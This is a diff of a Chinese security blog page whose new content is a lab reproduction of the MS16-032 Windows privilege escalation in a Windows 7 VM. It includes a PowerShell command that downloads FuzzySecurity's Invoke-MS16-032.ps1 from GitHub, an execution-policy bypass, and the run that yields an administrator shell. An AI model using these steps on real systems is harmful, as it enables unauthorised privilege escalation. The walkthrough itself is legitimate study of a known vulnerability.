@@ -6,15 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
-  <title>Archives: 2019/7 | Knlvre</title>
+  <title>MS16-032 复现 | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Knlvre">
-<meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/archives/2019/07/index.html">
+  <meta name="description" content="漏洞exploit-db的详情：https://www.exploit-db.com/exploits/39574/ 利用时需要满足的要求  ①系统需要拥有至少2个的CPU核心 ②Power shell v2.0以及更高的版本  影响的Windwos版本  Windows Vista、Windows 7、Windows 2008 Server、Windows 2012 Server、Windows">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MS16-032 复现">
+<meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/10/04/MS16-032-复现/index.html">
 <meta property="og:site_name" content="Knlvre">
+<meta property="og:description" content="漏洞exploit-db的详情：https://www.exploit-db.com/exploits/39574/ 利用时需要满足的要求  ①系统需要拥有至少2个的CPU核心 ②Power shell v2.0以及更高的版本  影响的Windwos版本  Windows Vista、Windows 7、Windows 2008 Server、Windows 2012 Server、Windows">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-10-03T19:25:10.331Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Knlvre">
+<meta name="twitter:title" content="MS16-032 复现">
+<meta name="twitter:description" content="漏洞exploit-db的详情：https://www.exploit-db.com/exploits/39574/ 利用时需要满足的要求  ①系统需要拥有至少2个的CPU核心 ②Power shell v2.0以及更高的版本  影响的Windwos版本  Windows Vista、Windows 7、Windows 2008 Server、Windows 2012 Server、Windows">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
   
@@ -132,60 +137,172 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-MS16-032-复现" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/Knlvre.github-io/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/Knlvre.github-io/2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/" class="archive-article-date">
-  	<time datetime="2019-07-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-26</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/Knlvre.github-io/2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/">2019 ISCC — 线下赛WriteUp</a>
+    <h1 class="article-title" itemprop="name">
+      MS16-032 复现
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/Knlvre.github-io/2019/10/04/MS16-032-复现/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>exploit-db的详情：<a href="https://www.exploit-db.com/exploits/39574/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39574/</a></p>
+<p>利用时需要满足的要求</p>
+<blockquote>
+<p>①系统需要拥有至少2个的CPU核心</p>
+<p>②Power shell v2.0以及更高的版本</p>
+</blockquote>
+<p>影响的Windwos版本</p>
+<blockquote>
+<p>Windows Vista、Windows 7、Windows 2008 Server、Windows 2012 Server、Windows 8.1、Windows 10</p>
+</blockquote>
+<p>本次复现的版本为Windows 7，其他的没有再去复现</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>虚拟机平台：VMware Workstation Pro</p>
+<p>测试机：Windows 7</p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>测试一：普通用户登录下，获取管理员cmd</p>
+<p>脚本地址：<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1" target="_blank" rel="noopener">1_Invoke-MS16-032.ps1</a></p>
+<p>创建文件的方法有多种，这里演示两种：</p>
+<p>①创建文件<code>1_Invoke-MS16-032.ps1</code>并写入内容；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; 1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad 1_Invoke-MS16-032.ps1	#写入内容</span><br></pre></td></tr></table></figure>
+<p>②用之前提到的powershell脚本直接下载文件</p>
+<p>Ps：可以参考我之前转载的文章：<a href="https://knlvre.github.io/Knlvre.github-io/2019/10/04/%E5%8D%81%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/">十三种方式下载文件</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;type download.ps1</span><br><span class="line">$p = New-Object System.Net.WebClient</span><br><span class="line">$p.DownloadFile(&quot;https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1&quot;,&quot;E:\MS16-032\1_Invoke-MS16-032.ps1&quot;)</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;dir</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          .</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          ..</span><br><span class="line">2019/10/04  03:08               184 download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\download.ps1</span><br><span class="line">PS E:\MS16-032&gt; dir</span><br><span class="line">Mode                LastWriteTime     Length Name</span><br><span class="line">----                -------------     ------ ----</span><br><span class="line">-a---         2019/10/4      3:08      11460 1_Invoke-MS16-032.ps1</span><br><span class="line">-a---         2019/10/4      3:08        184 download.ps1</span><br></pre></td></tr></table></figure>
+<p>文件下载好之后，先展示一下当前用户，以及属组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;whoami</span><br><span class="line">win-vn2rcoukihc\test</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user  test</span><br><span class="line">用户名                 test</span><br><span class="line">...</span><br><span class="line">可允许的登录小时数     All</span><br><span class="line"></span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<p>无权的一个用户，现在开始执行脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; Invoke-MS16-032</span><br><span class="line">         __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">        |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">        |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">        |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                       [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br></pre></td></tr></table></figure>
+<p>执行完之后，直接拿到管理员的cmd</p>
+<p><img src alt="1-1"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF比赛</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://knlvre.github.io/Knlvre.github-io/2019/10/04/MS16-032-复现/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">十三种方式下载文件</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -208,8 +325,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
